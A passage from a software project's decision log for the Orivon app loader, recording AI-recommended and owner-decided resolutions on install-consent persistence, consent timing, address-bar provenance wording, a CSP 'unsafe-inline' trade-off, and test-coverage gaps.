which this run treats as an owner gate (license, provenance and pure-JS status reviewed first,
`CLAUDE.md` Rules 6 and 8). The lane could not safely run `npm install` either: every fleet
worktree symlinks one shared `node_modules`, so an install mid-run would mutate the tree other
lanes are building against.

**Worth weighing when deciding.** Declaring `esbuild` explicitly adds **nothing** to the
installed tree -- it is already there, already in the lock file, already audited by
`check:natives` as part of `vite`'s subtree. What changes is only whether this repository states
that it depends on it. So the usual "is this dependency acceptable" question is not really the
question; the question is whether an undeclared transitive import is acceptable as a *test-time*
dependency.

**The cost of leaving it.** `vite` is free to drop or swap its bundler in any minor release. The
day it does, this test fails with a module-resolution error that names `esbuild` and explains
nothing about why a test that never mentioned it in `package.json` was relying on it. That is a
confusing failure landing on whoever is unlucky, not on whoever chose it.

**AI recommendation:** declare `esbuild` in `devDependencies` at the version already resolved in
the lock, in a PR of its own that touches nothing else, so the lock diff is reviewable. The
alternative -- rewriting the test to use the repo's own `electron-vite` build rather than a
direct bundler call -- is more faithful to Rule 6 but materially more work, and the test's whole
purpose is to be a small, independent harness that does not depend on the app build.

**Needed by:** no deadline. It works today and will keep working until `vite` changes.

### A145 -- a declined install-consent dialog is not remembered across a restart **[RESOLVED 2026-09-14 -- lane D-remember-no]**

**Raised 2026-09-13**, lane S4-4-consent, implementing `d-0025` (`ADR-0012`'s 2026-09-13
amendment): one dialog, once per origin, ever, for the whole set a manifest declares.

**"Once per origin, ever" is derived from the grant ledger's own hydration, not tracked as new
state** (`src/main/install-consent.ts`). `GrantLedger.registerApp`'s existing `grantsHydrated`
mechanism already restores every still-valid persisted grant into the live ledger, checked
against the manifest just fetched, before the consent step ever runs -- so an origin ACCEPTED on
any earlier visit, this session or a past one, already holds a live grant for its declared
capabilities and is silently skipped. This is real "once ever" persistence, for free, reusing a
mechanism that already shipped for an unrelated reason.

**What it does not cover: a fully DECLINED visit.** All-or-nothing (`A138`) means declining
creates no grant at all, and `LedgerStorage` has no concept of "asked, and the answer was no" --
only of what was actually granted. A declined origin is therefore indistinguishable, on disk,
from one never visited, and is asked again on its next visit (a fresh browser launch; a repeat
visit within one run is remembered in memory via the same live-grant check, so this is narrower
than it may first sound -- only a RESTART loses it, and only for a decline, never an accept).

**Two ways to close it, and this lane picked neither on its own:**

1. Add a persisted "consent decision" marker to `LedgerStorage` (a fourth file alongside the
   version floor, rollback acknowledgement and grants), written on every decision -- accept or
   decline -- and consulted before the dialog is shown. Real engineering, touching every
   `LedgerStorage` implementation and the settings-list reasoning `A137` already worked through
   for a similar-shaped problem (display vs. authority).
2. Accept it as intended, not merely tolerated: a person who declines an app is asked again next
   time they revisit it, which gives them a natural, no-UI way to reconsider later, symmetrical
   with the existing settings-list revoke-then-re-grant path (`A101`) for the accepted side.

**AI recommendation, not a decision:** option 2, on the grounds that repeated friction for a
repeatedly-declined app is a real product property, not obviously a bug -- but this is exactly
the kind of call `CLAUDE.md` Rule 2 says an agent should label rather than make silently, and this
lane's own report says so explicitly.

**Needed by:** whenever the owner reviews the S4-4 checkpoint's real dialog (the same moment
`A139` is settled) -- worth deciding alongside it rather than separately, since both are about
what "once, ever" should actually mean once a real person is declining a real dialog.

> **Resolved 2026-09-14, lane `D-remember-no` (owner decision).** The owner decided directly,
> not by picking one of the two options above: **remember the no.** Repeated friction on every
> restart for an app someone already refused is not accepted as a real product property after
> all -- it trains the reflex the rest of this consent design exists to avoid (`ADR-0012`'s own
> Reasoning). Option 1 is now built, close to as sketched: `LedgerStorage` gained a fourth
> per-origin file, `declined-capabilities.json`, alongside the version floor, rollback
> acknowledgement and grants (`src/broker/grants/ledger-storage.ts`,
> `node-ledger-storage.ts`) -- written by `GrantLedger.recordDeclinedConsent`, read by
> `declinedCapabilitiesFor`, cleared by `clearDeclinedConsent`, all three thin wrappers over a
> new `src/broker/grants/declined-consent.ts` mirroring `update-safety.ts`'s own floor/
> rollback-ack shape. `requestInstallConsent` (`src/main/install-consent.ts`) now checks it
> between the existing "already held" check (`A157`) and showing the dialog.
>
> **What is stored, and why not less or more.** Exactly the declared capability set the dialog
> was declined FOR (`readonly CapabilityKind[]`, e.g. `['tcp.connect', 'fs']`) -- a bare boolean
> cannot answer "is this still the same question", and the whole manifest is more than needed
> and re-opens `A137`'s already-settled ruling (a value read off disk must not gain authority it
> would not have arriving fresh; a manifest reappearing here could tempt a future caller into
> re-deriving patterns from it, which `A137`'s own display-only `PersistedApp.appName: string`
> shape was built specifically to make impossible). The stored set is capability NAMES only, in
> its own file, never mixed into `grants.json` -- structurally incapable of being read as a
> grant, proven directly in `node-ledger-storage.test.ts`.
>
> **Two fixed points, both held:** (1) `capabilities.every(c => declined.includes(c))` is the
> comparison -- a manifest that now declares something NOT in the declined set asks again (a
> genuinely different question), one that declares the same set or a subset stays suppressed.
> (2) It is consulted ONLY inside `requestInstallConsent`, never by anything that grants --
> `GrantLedger.grant`/`decideGrantRequest` do not know this file exists. The adversarial test in
> `src/main/tests/install-consent.test.ts` ("a remembered decline never results in a live grant
> ...") wires the consent prompt to always accept if it is ever asked again, across three
> simulated restarts sharing one persisted store, and shows it is never called and `grants()`
> stays empty throughout.
>
> **The narrow-vs-widen question this entry's own §2026-09-13 draft flagged as needing a
> decision is answered for the NARROW direction too, and it is an AI recommendation, explicitly
> retunable, not an owner decision:** a manifest that later declares LESS than was declined stays
> suppressed rather than re-prompting for the smaller ask. Argument for: the person already
> looked at a superset of this exact request and said no; re-litigating a strict subset of a
> question already answered reads as the same fatigue `ADR-0012` exists to prevent, not as a
> considerate offer. Argument against, recorded rather than dismissed: it means a person can
> never be offered the smaller, more reasonable request without the manifest changing first.
> **How to change your mind without a manifest change, today: `app.requestGrant`
> (`src/main/request-grant.ts`), the app's own live per-capability door, is completely unaffected
> by this record** -- it is a second, independent path to a grant (the exact path `A157` is
> about), so an app that offers its own "connect" affordance still works, and whatever it grants
> shows up in the permissions list and is revocable there (`A101`), same as any other grant. If
> real usage shows people wanting a narrower re-ask from the install dialog itself specifically,
> flip the comparison's direction here -- the storage shape needs no change, only
> `install-consent.ts`'s own comparison.
>
> **An accept clears the record** (`clearDeclinedConsent`, called from `requestInstallConsent`'s
> own accept branch): an old "no" cannot outlive a "yes" for the same-or-narrower question once
> one has actually been given. `GrantLedger.forgetOrigin` (A60) also deletes it, alongside the
> floor, rollback acknowledgement and grants it already forgets.
>
> Verified: `src/broker/grants/tests/grant-ledger-declined-consent.test.ts` (20 cases, the
> GrantLedger layer, mirroring the rollback-acknowledgement suite's own restart idiom),
> `node-ledger-storage.test.ts`'s new describe block (real disk, atomic-write and corrupt-read
> discipline matching every sibling file), and `src/main/tests/install-consent.test.ts` (the
> real flow, including the widen/narrow cases above and the adversarial restart test).

### A146 -- install-time consent is asked AFTER the page's own scripts are already running **[RESOLVED 2026-09-15 -- owner decision]**

**Raised 2026-09-13**, at the seam between the discovery trigger (#164) and install-time consent
(#171), by the conductor while merging the two -- neither lane could see it alone, which is why it
is filed here rather than in either PR.

Owner decision `d-0025` chose consent-at-install over consent-at-first-use for one concrete
reason: *an app that does not know Orivon exists cannot pause mid-request for a dialog. It fires
parallel requests with its own timeouts and retries, and a capability that answers `'denied'`
while a human reads a popup is indistinguishable, to that app, from a capability that is simply
absent.*

**The built flow does not fully deliver that on a first visit.** The only discovery trigger is a
`<link rel="orivon-manifest">` hint in HTML the page already delivered (`ADR-0012`). The page-side
half reports that hint at `DOMContentLoaded`; main then fetches, validates, pins, caches, and only
then asks. By the time the dialog appears, **the page's own scripts have been running for some
time** -- so a first-visit script calling `orivon.net.connect` gets `'denied'`, which is exactly
the race `d-0025` was chosen to remove.

**What is NOT affected, and it is most of the lifetime:** every later visit. The grant is held
until revoked (`A101`), the manifest is re-validated, and consent is skipped silently -- so the
app starts with a decided answer and never races anything. The defect is bounded to the first
visit to a given origin.

**Why it was not fixed in place.** Closing it means the tab must not run the app's scripts until
install and consent have settled -- holding or deferring the navigation, then loading from the
served cache. That is a change to how a tab navigates (`src/main/tabs.ts`, and the interaction
with `ADR-0007`'s partition-scoped serving), not something either the hint listener or the
consent prompt can do from where they sit. It is also a **user-visible behaviour decision**: a
page that visibly pauses before running is a different experience from one that runs and is
interrupted by a dialog, and which is better is the owner's call, not an implementation detail.

**Options, none chosen:**

1. **Hold the first navigation** to a hinted origin until install and consent settle, then load
   from cache. Delivers `d-0025` fully; costs a visible pause on first visit, on a page the user
   has not yet decided they want.
2. **Let the page run, and have the app find out.** What is built today. No pause; a first-visit
   app sees denials until the person answers. Tolerable for an app written for Orivon, bad for a
   ported app that assumes its network works.
3. **Re-run the app after consent** -- reload the tab from the served cache once a grant exists,
   so the app's second start is clean. Cheap, and it makes the first start disposable rather than
   broken; costs a reload the user did not ask for, and is wrong for an app that already did
   something stateful on its first start.

**Needed by:** before an app that was not written for Orivon is expected to work on a first
visit -- i.e. before Phase 5's FreeTube lane means anything. Not blocking anything merged today.

> **Owner decision, 2026-09-15: accepted as built, not a defect owed a fix.** The owner, put
> directly to this entry:
>
> > "Lets keep the system like this, we accept that when the app is first open, permission box
> > opens, and it can be told no for an instant."
>
> **In plain terms:** on a first-ever visit to an app, that app's own code may run for a brief
> window before the permission box has appeared or been answered, and a capability call made in
> that window is told `'denied'` -- a refusal the app did not expect and was never told to
> expect. That is now the accepted shape of the system, not an open defect waiting on a fix.
>
> **This keeps option 2 above as the shipped design, and closes the other two by declining
> them, not by picking a winner among them later.** Option 1 -- hold the first navigation until
> install and consent settle, then load from cache -- was fully specified above and was
> available to build. It was declined: making a page visibly pause before it is allowed to run
> is a different experience from one that runs immediately and might be told no for an instant,
> and the owner's call is that the second is the one worth keeping. Option 3 (silently reload the
> tab once a grant exists) was not chosen either, for the reason already given above -- it costs
> a reload the person did not ask for and is wrong for an app that already did something stateful
> on its first start.
>
> **The acceptance is bounded exactly as this entry's own evidence already bounded it: to the
> first visit only.** Every later visit is unaffected -- the grant is already decided, held
> until revoked (`A101`), and the app starts with a settled answer before it runs at all.
> Nothing about this decision touches that; it is a decision about the one already-isolated
> moment above, not about consent timing generally.
>
> **What this does not settle, so it is not read into it:** `A158`'s restart-time CSP gap (a
> registered app's first document served narrower than its real, already-persisted grant) looked
> like the same underlying gap while it was open, and its own text asked whoever decided `A146`
> to see it. It has since been closed a different way -- by re-hydrating grants from the
> already-verified pinned manifest, not by holding a navigation (`A158`'s 2026-09-14 resolution)
> -- so nothing here reopens it or depends on it.

### A147 -- the address-bar provenance wording, and the two-state-vs-three-state choice it rests on **[NEEDS OWNER DECISION]**

**Raised 2026-09-13**, lane S4-6-csp, build step 4's CSP/provenance item (`ADR-0007`,
`ADR-0006`). `ADR-0007` requires the address bar to say, in some words, that a tab is running
from Orivon's own pinned local cache rather than a live TLS connection, and suggests the wording
*"running from local cache, pinned"* without mandating it verbatim.

**What shipped:** the address-bar dot (`src/renderer/main.ts`'s `updateAddressDot`) gains a
third state, `.cached`, alongside the existing `secure`/`insecure` (green/orange). Its tooltip
and `aria-label` are the literal string **`"Running from local cache, pinned"`** -- capitalised
as a sentence, since every other tooltip in this UI is (`addressPermissionsBtn`'s "This site has
no Orivon permissions"). Colour: `--waccent` (the app's own theme-invariant indigo accent),
neither the secure green nor the insecure orange, on the reasoning that a pinned-cache load is
neither of those claims and borrowing either colour would overclaim or under-claim.

**Still open, owner's call, not decided here:**

1. **Is a same-colour dot with a different tooltip enough, or does ADR-0007's "the UI must say
   so" want the word "cached" (or similar) visible without hovering?** A dot with no visible
   text is consistent with how `secure`/`insecure` already work today (colour only, no tooltip
   on hover for either state currently, though this PR is the first to put text on the dot at
   all) -- but ADR-0006's whole framing is "evidence-first," and a hover-only signal is easy to
   miss on a first read. AI recommendation: ship the hover-only version now (least UI surface
   added, consistent with the existing dot), and revisit once build step 6's trust indicator
   gives cached delivery a permanent, always-visible home -- but this is exactly the kind of
   product-feel call `CLAUDE.md` says to explain in plain language rather than assume.
2. **Is the literal string right?** `"Running from local cache, pinned"` is ADR-0007's own
   suggested wording, used verbatim rather than paraphrased so the ADR and the UI can never read
   differently by accident -- but "pinned" is jargon this codebase understands (TOFU/hash-pin)
   that an ordinary user has not been introduced to anywhere else in the UI yet. An alternative
   considered and not chosen: `"Running offline from a saved copy"` -- plainer, but drops the
   word ADR-0007 itself chose, and loses the specific claim "pinned" makes (verified against a
   hash, not just cached).
3. **Should the dot ever show BOTH facts at once** -- e.g. a pinned app whose bundle is ALSO
   served under `https://`, meaning the origin's own declared scheme is secure even though these
   particular bytes came from disk? Today the two are mutually exclusive in the UI (`.cached`
   replaces `.secure`/`.insecure` outright, per `updateAddressDot`), on the reasoning that "where
   the bytes came from" is the more load-bearing fact for a user deciding whether to trust the
   page right now, and showing both risks reading as a contradiction rather than two
   complementary facts. Not settled as a permanent design, only as this lane's least-surprising
   default.

**Needed by:** before build step 6 designs the full trust indicator, which will likely want to
say more about delivery provenance than a tooltip can hold -- this entry's answers should inform
that design rather than be silently superseded by it.

### A148 -- `script-src 'unsafe-inline'` on the served bundle gives up CSP's XSS role, and the reasoning for it only covers static markup **[REFRAMED 2026-09-15 -- owner decision; residual open]**

**Raised 2026-09-13**, conductor review of PR #172 (S4-6), which set the served bundle's CSP to
`default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'` plus the
grant-derived `connect-src`.

**The argument in the code is correct as far as it goes.** An inline `<script>` inside a pinned,
hash-verified `.html` file is exactly as verified as the pinned `.js` file that `'self'` already
admits; there is no hash or nonce allowlist built that could admit one without the other; and a
nonce cannot be injected without rewriting the served bytes, which would break the pinning
guarantee that makes the whole origin trustworthy. Blocking inline script would break apps that
legitimately ship it, in exchange for a rule this origin's own serving guarantee already makes
redundant *for static markup*. That reasoning is sound and this entry does not dispute it.

**What it does not cover, and what is actually being given up.** CSP's `script-src` is not only an
integrity control over the markup the author shipped -- it is the last line of defence when an app
renders data it did not author. A pinned Orivon app that fetches remote content and puts it in the
DOM (a Nostr client rendering notes, a video app rendering titles and descriptions, anything
talking to an API it does not control) is exactly the case where `'unsafe-inline'` stops
protecting. The bundle being hash-pinned says nothing about the bytes it pulls at runtime, and
those are the bytes an attacker controls. So the gap is not "inline script the author wrote"; it
is "script an attacker gets the author's page to create".

**Why this is filed and not fixed.** The fix is a real mechanism, not a config change: emit
per-script `sha256-` source expressions in the header, computed from the pinned file contents at
serve time. The bundle hash machinery already hashes every leaf, so the inputs exist -- but CSP
script hashes are over the *script element's text*, not the file, so it means parsing each served
HTML document and hashing each inline block. That is a self-contained piece of work with a real
cost, and it is not this lane's scope.

**It is also not urgent today, for a reason worth writing down rather than assuming.** `A143`: a
`protocol.handle` registration intercepts the whole scheme for that partition, so an app's page
currently cannot reach any third-party host at all -- a CSP-permitted request hits the app's own
handler and gets a 404. The remote-data scenario this entry is about therefore does not exist yet.
**It starts existing the moment `A143` is resolved in favour of proxying**, which makes these two
questions a pair: whichever way `A143` goes decides how much this one matters.

**AI recommendation:** leave `'unsafe-inline'` as shipped, and treat per-script hashes as the
upgrade that lands alongside any decision to let an app reach third-party hosts. Do not silently
carry the current reasoning forward into that world -- it was written for a bundle that talks to
nothing.

**Needed by:** whenever `A143` is decided, and before any app renders remote content it does not
author.

**Update 2026-09-14, lane F-reach -- A143 is now decided, and the precondition above needs a
correction, not just a confirmation.** `A143`'s own resolution note explains what this lane built:
apps can now reach a granted third-party host, so "the remote-data scenario this entry is about"
is real starting with this PR, exactly as predicted. **But the premise "it does not exist yet" was
already stale before this lane touched anything.** `src/preload/fetch-route.ts`'s `installFetchRoute`
(ADR-0017) routes an app tab's own `fetch()` to `orivon.net.connect`/`connectSecure` for a granted
host, is already wired unconditionally in `preload/app.ts`'s production path, and
`test/e2e-fetch-routing.test.ts` already proves it reaches a granted host and returns real bytes
in production, gated purely on `tcp.connect`/`https.connect` -- CSP and `A143`'s own protocol.handle
interception play no part in it at all (that routing bypasses Chromium's network stack entirely,
`ADR-0017`'s own Consequences section). So an app fetching remote JSON/HTML and rendering it into
the DOM (a Nostr client rendering notes, exactly A148's own example) was **already able to**, the
moment ADR-0017's routing landed -- independent of A143, and before this lane. This entry's own
"starts existing the moment A143 is resolved" pairing was therefore always incomplete: A143 controls
whether an IMAGE/FONT/MEDIA response can carry attacker-controlled bytes into the page (a resource,
never executable through those specific CSP directives, which stay untouched -- `script-src` is
still exactly `'self' 'unsafe-inline'`, unaffected by this lane), while `fetch()`-routed remote text
already controlled whether an attacker-influenced STRING could reach `innerHTML`/`document.write`
and be reinterpreted as an inline `<script>` `'unsafe-inline'` would then run.

**So: this lane's own change does not newly activate the risk A148 describes** -- the risk was
already live via ADR-0017's routing, on a different, earlier-landed path this lane did not touch
and does not own. **It is not closed either.** Nothing here implements per-script hashing, and
nothing here should be read as having assessed whether the ALREADY-live fetch()-based version of
this risk is otherwise mitigated. Filed precisely, per this lane's own brief, rather than left
ambiguous: **A148 stays open, its status corrected from "will start mattering" to "already
matters, on a path outside this lane's ownership as well as on this one," and the per-script-hash
fix it names is still owed on both.**

> **Update 2026-09-15, lane H-decisions -- this entry's own framing is corrected by the owner,
> not only its status, and the correction is more fundamental than the 2026-09-14 update above.**
> The conductor had, across this entry and elsewhere, repeatedly cast the risk as "everything an
> app runs must have come from the bundle you approved, so an app reaching third-party code is a
> hole in that guarantee." The owner corrected that framing directly:
>
> > "What matters is that the basical bundle is the one approved. Potentially it could be only
> > index.html, but this would drastically reduce the chances of a valid Web3 score for that
> > site. The thing isn't that everything running from this app came from the bundle, but that a
> > X bundle has been verified to be trustless by being on its original form, even if it fetches
> > third party code, because he may still do it in a trustless manner."
>
> **The guarantee `ADR-0009`'s bundle hash actually makes is narrower than the conductor's
> framing, and this entry inherited that error.** It proves the app's OWN code -- exactly the
> bytes in its pinned bundle -- is unaltered from what its author published. It has never
> claimed, and was never built to claim, that nothing else runs. An app that deliberately fetches
> and runs third-party code is not violating that guarantee; the guarantee about the bundle it
> shipped still holds regardless, and the app can still be reaching out in a manner that is
> itself verifiable -- "trustless" describes HOW it reaches third parties, not a promise that it
> never does.
>
> **What deliberate third-party reach actually costs is trust SCORE, not correctness.** An app
> that ships almost nothing in its own pinned bundle and pulls the rest at runtime has very
> little that is actually verified by the pin -- and `ADR-0006`'s indicator, not CSP, is where
> that should be visible to a person deciding whether to trust the app. **See `A166` below**,
> filed alongside this correction: nothing in the shipped delivery ladder
> (`src/trust/delivery-ladder.ts`, D1-D4) currently measures how much of a running app the pin
> actually covers, only how the pin was obtained. That is the residual this reframe hands to
> build step 6, not to CSP.
>
> **Per-script CSP hashing is therefore no longer owed as the fix for "an app reaches
> third-party code"** -- that was never the right problem for it to solve, and this entry's own
> 2026-09-14 update above had already narrowed toward the real one without naming the reframe
> explicitly.
>
> **But do not read this as clearing the entry -- the part of it that survives untouched is the
> more concrete half.** The scenario this entry has been narrowing to since 2026-09-14 -- an
> attacker-influenced STRING, fetched by the app's own code, reaching `innerHTML`/
> `document.write` and being reinterpreted as an inline `<script>` because `'unsafe-inline'`
> does not distinguish the author's own markup from anything else -- is **not** "the app
> deliberately runs third-party code." It is the app's OWN rendering of data it did not author
> going wrong: the same DOM-based-injection failure `script-src` exists to catch on any ordinary
> website. Nothing about a bundle's trust score changes whether that specific injection
> executes -- a low-scored app and a high-scored app are equally exposed if either mishandles
> what it fetches, and a person reading a trust score has no way to see this particular risk from
> it. Per-script `sha256-` hashing (this entry's original proposal) would still be a correct,
> working defence against exactly that scenario, because an attacker-injected `<script>` has no
> matching allowlisted hash regardless of where the data that produced it came from. **This half
> of the entry stays open**, as real but narrower and lower-priority security work than
> originally framed -- owed whenever an app both reaches a third party (true today, `A143`/
> `ADR-0017`) and renders what it gets back as raw markup, not whenever it merely fetches
> third-party code at all.

### A166 -- the delivery ladder grades HOW a bundle was pinned, never HOW MUCH of the running app that pin actually covers **[NEEDS OWNER DECISION -- build step 6]**

**Raised 2026-09-15**, lane H-decisions, while recording the `A148` reframe above. This entry
files the gap; it does not build the measurement -- a sibling lane
(`stream/trust-02-pin-coverage`) owns `src/trust/` and the mechanism, and this is the reasoning
for why it is needed, left for that lane to read rather than pre-empted here.

**What the ladder measures today.** `ADR-0006`'s D1-D4 rungs, implemented in
`src/trust/delivery-ladder.ts`, grade *how* an app's code arrived: fetched fresh every load
(D1), fetched once and hash-pinned (D2), content-addressed (D3), content-addressed and
trustlessly name-resolved (D4). Each rung is evaluated as a single pass/fail fact about the
whole bundle (`DeliveryRungResult.met: boolean`), with no notion of size, proportion, or what
fraction of the code a person actually runs was inside the thing that got pinned.

**Why that is a real gap, not a nicety, given the `A148` reframe.** The owner's correction
settled that a bundle fetching third-party code is not a violated guarantee -- it is a scored
fact. But nothing currently produces that score. An app whose pinned bundle is a two-file
`index.html`-plus-manifest that immediately fetches thirty remote scripts sits on **exactly the
same D2 rung** as an app that ships everything it runs. Both read as "hash-pinned, TOFU once" to
anyone looking at the ladder today, even though the first has almost nothing a person's consent,
or a future attestation, actually covers. `ADR-0006`'s own worked example -- *"if the site is
completely running locally, we can say that this is trustless"* -- implies the inverse should
also be visible: if it is NOT completely running locally, the indicator should say how far from
that it is, not silently round up to the same rung as a bundle that is.

**What "coverage" would need to mean is left to the sibling lane to define precisely, not
prescribed here:** some measure of how much of what the app actually executes was present in the
pinned bundle versus fetched at runtime outside it -- a byte count, a file count, or a
runtime-observed fraction via the connection log (`src/trust/connection-log.ts` already keeps
the entries such a measure would read). Any of these is a defensible starting point; none is
specified here, deliberately, per this lane's own brief to record the reasoning rather than the
mechanism.

**Needed by:** whoever builds build step 6's real trust indicator -- `stream/trust-02-pin-coverage`
is already the named lane for it as of this writing.

> **Update 2026-09-15.** `stream/trust-02-pin-coverage` (PR #198) landed the measurement this
> entry asked for: `src/loader/pin-coverage.ts` and `electron-serve.ts`'s `pinCoverageFor` now
> track, per origin, how many requests and bytes came from the pin versus a granted third-party
> host, and `src/trust/delivery-ladder.ts`'s `DeliveryHistoryInput`/`DeliveryEvidence` now carry
> that as a `pinCoverage` field end to end.
>
> **What this entry actually asked for is still open.** The new field is evidence only --
> `metRung` is unchanged, and by the field's own doc comment "no rung here reads it... this
> scores nothing; see build step 6 for how it renders". Nothing yet reads the number back out
> in production either (A181). The scoring/rendering decision this entry raised -- how coverage
> should affect the ladder, or whatever a person actually sees -- is still unmade, still left
> for build step 6. This entry is not resolved.

### A149 -- `scripts/smoke.mjs`'s favicon scenario cannot pass under both T12 and "hermetic by construction" at once **[NEEDS OWNER DECISION]**

**Raised 2026-09-13**, `S4-S-smoke` lane, while fixing the dashboard-navigate self-destroy race
below (the actual defect this lane was dispatched to investigate). That fix let the smoke script
run far enough to reach the favicon scenario for the first time in a while -- the dashboard bug
aborted every prior run before this section ever executed, so this is newly EXPOSED, not newly
INTRODUCED, and unrelated to `tabs.ts`/`tab-view.ts`.

**The two checks that now fail, deterministically, every run:** "the real favicon renders as a
data: URL" and "the favicon still renders correctly right after a cross-origin navigation."
`favicon.ts`'s `isSafeFaviconUrl` (landed after this scenario was written, `f5cc3a9`/`301c72f`)
refuses any candidate that is not `https:` outright, and separately refuses any literal address
that is not `isPublicUnicast` -- `127.0.0.1` fails both independently. The smoke script's own
fixture server (`startFixtureServer`, this file) only ever serves plain `http://127.0.0.1:<port>`,
so `fetchFaviconDataUrl` returns `null` every time, and the tab correctly falls back to the globe.
This is `isSafeFaviconUrl` working exactly as designed (T12, `security-model.md`) -- not a product
bug.

**Why this cannot be fixed by adjusting the fixture.** `isSafeFaviconUrl` resolves a HOSTNAME and
checks every answer, so aliasing a friendlier-looking hostname to `127.0.0.1` via
`HERMETIC_RESOLVER`'s `MAP` rule does not help -- the resolved address is still loopback, and the
check is exactly right to refuse it. Serving over `https:` would still fail the same
`isPublicUnicast` check on the literal address. There is no fixture shape that is both "a real
network fetch this script can hit without leaving the machine" and "an address T12 accepts" --
those two requirements are mutually exclusive by the security control's own design, not by an
accident of test setup.

**What this actually is:** a real conflict between two of this codebase's own standing
commitments -- `scripts/smoke.mjs`'s header promise ("HERMETIC BY CONSTRUCTION... passes on an
air-gapped machine") and this scenario's own stated goal ("exercises the actual fetch/cap/encode
path... rather than a stub"). T12 makes both true at once impossible for exactly this one
scenario now that the gate exists.

**AI recommendation, not implemented here (out of this lane's scope -- `favicon.ts` is not an
owned path for this fix, and the right shape is a real design call):** rescope the two failing
checks to assert the CORRECT, T12-compliant outcome instead of a successful fetch -- a loopback
favicon candidate is refused and the tab shows the generic globe, the same shape the "dangerous
schemes are refused" scenario already uses elsewhere in this file for an analogous "prove the
refusal, not a completed round trip" case. That drops real coverage of the success path
(`toDataUrl`/`readCapped` are still unit-tested directly, but the wiring from a page's own
`<link rel="icon">` through to a rendered `data:` `<img>` would then have no integration coverage
at all under `npm run smoke`) -- worth the owner deciding is an acceptable trade, not assuming it.

**Still open, owner's call:** (1) accept the coverage loss and assert refusal instead; (2) find
some other integration-test vehicle for the success path that is not `npm run smoke` (a
narrower vitest-level test against a fake `net.fetch`, closer to `favicon.test.ts`'s own existing
style, rather than a real Electron launch); or (3) something else not considered here.

**Needed by:** before this entry's two failing checks are removed, rewritten, or silently marked
`skip()` by a future lane that reaches them without knowing why they fail.

---

### A150 -- the reconsent/capability-widening/rollback-choice dialog wording is unreviewed **[AI-REC -- confirm at PR review]**

Found 2026-09-13, `stream/loader-06-approve-and-install` (S4-5), which built the only callers of
`Loader.load()`'s three pending outcomes and had to write three brand-new pieces of dialog text
that did not exist before (`src/main/grant-prompt-render.ts`'s `describeReconsent`,
`describeCapabilityPrompt`, `describeRollbackChoice`; the buttons are in
`src/main/update-outcomes-prompt.ts`). Same class of finding as A127/A133/A134 -- wording nobody
but the author has read yet -- filed for the same reason: the owner reviews words by reading them,
not by reading the code that produces them.

**The three literal texts, and the one AI call embedded in them worth naming explicitly.** All
three buttons pair "take the update" against **"Keep the current version"**, never "Deny" --
because declining any of these three outcomes does not deny a single capability, it declines the
WHOLE update and leaves the previously pinned bundle running untouched. "Deny" (install-consent's
own button, reused correctly there since that dialog really is a yes/no on capabilities for a
bundle already committed to disk) would misdescribe what happens here. Not put to the owner in
this exact form.

- `needs-reconsent` (same authority, changed code): title is the origin; message *"This app has
  been updated."*; detail *"{origin}\nClaims to be "{name}".\nIts code has changed. What it is
  allowed to do has not."*; buttons `Use the update` / `Keep the current version`, type `question`.
- `needs-capability-prompt` (an update asking for more than it already holds): title is the
  origin; message *"This app wants to do more than you already allowed:"*; detail lists every
  currently-declared capability via the SAME `describeCapabilityGrant` rows install-time consent
  uses (Rule 3) -- the full current set, not only the delta, matching `update.ts`'s own framing
  that a capability prompt "re-establishes consent for the app as it now is"; buttons `Allow` /
  `Keep the current version`, type `warning` the moment any row is unlimited, else `question`.
- `needs-rollback-choice` (`ADR-0013`): title is the origin; message *"This app is offering an
  older version."*; detail *"{origin}\nClaims to be "{name}".\nYou've used version {floor} or
  newer from this app before. It is now offering version {version} -- an older one.\nThis can be
  a genuine rollback by the developer, or a sign that something is serving old, less secure
  code."*; buttons `Use this version` / `Keep the current version`, type `warning` unconditionally.

**A second call worth flagging separately:** `describeCapabilityPrompt` shows the app's FULL
current declared set on every widening, not a delta highlighting only what is NEW. Deliberate --
producing an accurate delta needs diffing against what is actually held (`broker.app.grants`),
which `src/main/grant-prompt-render.ts` cannot read (it is Electron- and broker-free by design),
and the full-set framing is what `describeInstallConsent` already does for the identical shape of
content. Not tested against a real person; a future readability pass on this dialog should look
here first if "which one is new?" turns out to be the actual question a user asks.

**Adjacent, not a defect in this work:** an app whose update also drops a previously-granted
capability keeps that grant untouched (`GrantLedger.registerApp`'s own documented behaviour,
"existing grants are left untouched") -- confirmed intentional, not something this lane changed
or needs to flag further.

**Needed by:** before these three dialogs ship to a real user; ideally the same readability pass
`CLAUDE.md`'s standing rule already requires at the end of a build step.

---

### A151 -- `src/shim/globals.ts`'s `installGlobals()` has no production call site anywhere **[RESOLVED 2026-09-13 -- S4-X-shimfix]**

**Raised 2026-09-13**, `S4-7-e2e` lane, while building the end-to-end app-loader journey test
(`test/e2e-app-loader-journey.test.ts`). The first test to bundle a real `src/shim/` module
(`node-net.ts`) with esbuild and run it inside a real browser page, rather than injecting a fake
`orivon.net.connect` and calling shim internals directly (every existing `src/shim/tests/*`
suite's own pattern) -- so this is the first place a real dependency of `node-net-socket.ts`'s
`Duplex` base class (`stream-browserify`, via `module-map.ts`'s own alias) actually ran end to
end.

**What broke, and why nothing before this caught it.** `stream-browserify`'s `Readable.resume`
reads `process.nextTick` unconditionally. `src/shim/globals.ts` exists specifically to install a
polyfilled `process` (plus `setImmediate`/`clearImmediate`) onto a target -- `README.md`'s own
"Core polyfills (queue item 3.1)" group -- but `grep -rln "installGlobals(" src/` (excluding
tests) returns nothing: no preload, no renderer entry point, nothing calls it in this tree today.
Every existing `src/shim/tests/*.test.ts` either avoids anything importing `stream` or installs
globals onto a throwaway object itself before exercising the code under test, so this gap was
invisible until something ran the REAL module graph in a REAL browser global scope with nothing
having called `installGlobals` first: `ReferenceError: process is not defined`, thrown from
inside `stream-browserify`, several frames below any code this lane owns.

**Impact, stated precisely.** Any real Orivon app whose dependency graph pulls in `stream`
(confirmed transitively required by this shim's own `net`/`http`/`https` modules, and by
`crypto-browserify` per `module-map.ts`'s own notes) fails at load time in a real build today,
not merely in this test's fixture. This is a real product gap, not a test artifact --
`test/app-loader-journey-shim-entry.ts` works around it by calling `installGlobals(globalThis,
...)` itself, exactly the call a real production entry point will eventually need to make once,
early, before any shimmed module runs.

**AI recommendation, not implemented here (out of this lane's scope -- `src/shim/`'s remaining
wiring is build step 3's own call, and `src/main/`+`src/loader/` are two other lanes' owned paths
tonight):** call `installGlobals(globalThis, {reportError: ...})` exactly once, as early as
possible, in whatever the eventual "an app's own page has started running" entry point turns out
